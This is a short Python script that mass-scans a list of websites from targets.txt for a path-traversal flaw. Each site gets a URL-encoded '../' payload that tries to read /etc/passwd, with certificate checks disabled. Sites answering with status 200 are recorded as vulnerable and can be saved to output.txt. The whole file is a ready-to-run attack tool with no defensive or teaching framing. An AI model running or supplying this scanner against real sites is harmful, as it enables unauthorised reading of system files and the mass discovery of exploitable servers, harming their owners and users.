import requests
from requests.exceptions import RequestException, Timeout
from colorama import init, Fore
import signal
import sys

def scan_website(target_url):
    try:
        response = requests.get(target_url + "/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", verify=False, timeout=5)
        if response.status_code == 200:
            print(Fore.GREEN + f"[+] {target_url}/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
            return True
    except Timeout:
        print(Fore.YELLOW + f"[!] Connection timeout for {target_url}. Moving to the next target.")
    except RequestException:
        print(Fore.RED + f"[x] {target_url}.")
        pass
    return False

def handle_exit(sig, frame):
    print("\nDo you want to save vulnerable sites list in output.txt? (y/n): ")
    choice = input().strip().lower()
    if choice == 'y':
        with open("output.txt", "w") as output_file:
            output_file.write("\n".join(vulnerable_sites))
        print("Vulnerable sites list saved in output.txt.")
    sys.exit(0)

if __name__ == "__main__":
    init(autoreset=True)
    requests.packages.urllib3.disable_warnings()
    vulnerable_sites = []
    signal.signal(signal.SIGINT, handle_exit)
    
    with open("targets.txt", "r") as targets_file:
        for target_url in targets_file:
            if scan_website(target_url.strip()):
                vulnerable_sites.append(target_url.strip())
    
    print("\nDo you want to save vulnerable sites list in output.txt? (y/n): ")
    choice = input().strip().lower()
    if choice == 'y':
        with open("output.txt", "w") as output_file:
            output_file.write("\n".join(vulnerable_sites))
        print("Vulnerable sites list saved in output.txt.")
